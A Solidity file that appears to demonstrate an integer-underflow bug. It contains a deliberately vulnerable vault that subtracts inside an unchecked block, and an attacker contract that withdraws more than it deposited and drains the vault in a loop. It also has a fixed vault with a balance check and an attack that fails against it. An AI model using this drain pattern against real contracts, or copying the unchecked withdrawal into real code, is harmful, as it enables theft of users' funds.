// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VulnerableUncheckedVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        unchecked {
            balances[msg.sender] -= amount;
        }

        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "send failed");
    }
}

contract ArithmeticAttacker {
    VulnerableUncheckedVault public immutable TARGET;

    constructor(address targetAddress) {
        TARGET = VulnerableUncheckedVault(targetAddress);
    }

    function attack() external payable {
        require(msg.value == 1 ether, "seed must be 1 ether");

        TARGET.deposit{value: msg.value}();

        while (address(TARGET).balance > 0) {
            uint256 amount = address(TARGET).balance >= 2 ether ? 2 ether : address(TARGET).balance;
            TARGET.withdraw(amount);
        }
    }

    receive() external payable {}
}

contract FixedCheckedVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "insufficient balance");
        balances[msg.sender] -= amount;

        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "send failed");
    }
}

contract FailedArithmeticAttacker {
    FixedCheckedVault public immutable TARGET;

    constructor(address targetAddress) {
        TARGET = FixedCheckedVault(targetAddress);
    }

    function attack() external payable {
        require(msg.value == 1 ether, "seed must be 1 ether");

        TARGET.deposit{value: msg.value}();
        TARGET.withdraw(2 ether);
    }

    receive() external payable {}
}
